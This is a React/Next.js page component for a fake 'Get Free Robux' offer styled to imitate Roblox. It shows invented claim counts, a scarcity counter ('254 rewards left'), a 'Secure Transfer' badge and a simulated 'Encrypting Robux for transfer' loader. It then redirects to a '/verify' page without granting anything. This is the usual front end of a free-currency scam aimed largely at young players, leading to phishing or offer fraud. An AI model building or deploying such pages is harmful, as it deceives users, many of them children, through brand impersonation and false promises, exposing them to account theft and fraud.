'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Check, Loader2, Sparkles, TrendingUp, Users } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';

export default function FreeRobuxPage() {
  const router = useRouter();
  const [isProcessing, setIsProcessing] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);

  const rewards = [
    { amount: '24,000', bonus: '+1500 more', popular: false },
    { amount: '11,000', bonus: '+1000 more', popular: false },
    { amount: '5,250', bonus: '+750 more', popular: false },
    { amount: '2,000', bonus: '+300 more', popular: true },
  ];

  const handleClaim = (amount: string) => {
    setSelectedAmount(amount);
    setIsProcessing(true);
    
    // Simulate processing for 2.5 seconds before redirecting
    setTimeout(() => {
      router.push('/verify');
    }, 2500);
  };

  return (
    <div className="min-h-screen bg-[#F2F4F5] font-sans text-[#393B3D]">
      {/* Roblox-style Top Bar */}
      <div className="h-12 bg-white border-b border-gray-200 flex items-center px-6 justify-between">
        <div className="flex items-center gap-4">
          <div className="w-8 h-8 bg-[#0074BD] rounded-md flex items-center justify-center text-white font-black text-xs italic">R$</div>
          <span className="font-bold text-sm">Robux</span>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-1 text-xs font-bold text-gray-400">
            <Users className="w-4 h-4" /> 2,142,851 users claimed
          </div>
        </div>
      </div>

      <main className="max-w-4xl mx-auto py-12 px-6">
        <div className="mb-10 text-center md:text-left">
          <h1 className="text-4xl font-black mb-2 flex items-center justify-center md:justify-start gap-3">
            Get Free Robux <Sparkles className="text-yellow-500 w-8 h-8 fill-current" />
          </h1>
          <p className="text-gray-500 font-medium">Bonus item we picked for you</p>
        </div>

        {/* Roblox Style Main Card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden flex flex-col md:flex-row">
          
          {/* Left Side: Game Info */}
          <div className="w-full md:w-1/3 p-8 border-r border-gray-100 bg-gray-50/50">
            <div className="flex flex-col items-center text-center">
              <div className="relative w-32 h-32 rounded-full overflow-hidden border-4 border-white shadow-md mb-6 bg-white">
                <Image 
                  src="https://picsum.photos/seed/roblox1/200/200" 
                  alt="Plane Crazy" 
                  fill 
                  className="object-cover"
                />
              </div>
              <h3 className="text-xl font-black mb-1">Plane Crazy [UPDATE]</h3>
              <p className="text-gray-400 text-sm font-bold uppercase tracking-wider">Gravity Slider</p>
              
              <div className="mt-8 space-y-4 w-full">
                <div className="bg-green-50 text-green-600 p-3 rounded-xl text-xs font-black uppercase flex items-center gap-2">
                  <Check className="w-4 h-4" /> Secure Transfer
                </div>
                <div className="bg-orange-50 text-orange-600 p-3 rounded-xl text-xs font-black uppercase flex items-center gap-2">
                  <TrendingUp className="w-4 h-4" /> High Demand
                </div>
              </div>
            </div>
          </div>

          {/* Center: Reward Selection */}
          <div className="flex-1 p-8">
            <div className="grid grid-cols-1 gap-4">
              {rewards.map((reward) => (
                <div 
                  key={reward.amount} 
                  className="group flex items-center justify-between p-5 rounded-2xl border-2 border-gray-100 hover:border-[#00B06F] hover:bg-green-50/30 transition-all cursor-pointer"
                  onClick={() => handleClaim(reward.amount)}
                >
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 bg-[#00B06F]/10 rounded-full flex items-center justify-center">
                      <div className="w-6 h-6 bg-[#00B06F] rounded-md flex items-center justify-center text-white font-black text-[10px] italic">R$</div>
                    </div>
                    <div>
                      <div className="flex items-center gap-2">
                        <span className="text-xl font-black">{reward.amount}</span>
                        {reward.popular && (
                          <span className="bg-[#0074BD] text-white text-[9px] font-black uppercase px-2 py-0.5 rounded-full">Popular</span>
                        )}
                      </div>
                      <span className="text-xs font-bold text-gray-400 uppercase tracking-tighter">{reward.bonus}</span>
                    </div>
                  </div>
                  
                  <Button className="bg-[#00B06F] hover:bg-[#008F5B] text-white font-black rounded-full px-8 h-12 shadow-lg shadow-green-500/20 transition-all group-hover:scale-105">
                    Free
                  </Button>
                </div>
              ))}
            </div>

            <div className="mt-8 pt-8 border-t border-gray-100 flex flex-col md:flex-row items-center justify-between gap-4">
              <p className="text-xs text-gray-400 font-bold max-w-xs text-center md:text-left">
                *Only available for limited time. Rewards are distributed on a first-come, first-served basis.
              </p>
              <div className="flex items-center gap-2 text-[#00B06F] font-black text-sm">
                <Users className="w-5 h-5" /> 254 rewards left
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Processing Modal */}
      <Dialog open={isProcessing} onOpenChange={setIsProcessing}>
        <DialogContent className="sm:max-w-md bg-white border-none rounded-3xl p-12 text-center">
          <DialogHeader>
            <DialogTitle className="hidden">Processing</DialogTitle>
          </DialogHeader>
          <div className="flex flex-col items-center space-y-6">
            <div className="relative">
              <Loader2 className="w-20 h-20 text-[#00B06F] animate-spin" />
              <div className="absolute inset-0 flex items-center justify-center font-black text-[#00B06F] text-xs italic">R$</div>
            </div>
            <div className="space-y-2">
              <h2 className="text-2xl font-black text-[#393B3D]">Processing Reward...</h2>
              <p className="text-gray-400 font-bold uppercase tracking-widest text-xs">Encrypting {selectedAmount} Robux for transfer</p>
            </div>
            <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden mt-4">
              <div className="bg-[#00B06F] h-full animate-[progress_2s_ease-in-out]" style={{ width: '100%' }} />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <style jsx global>{`
        @keyframes progress {
          0% { width: 0%; }
          100% { width: 100%; }
        }
      `}</style>
    </div>
  );
}
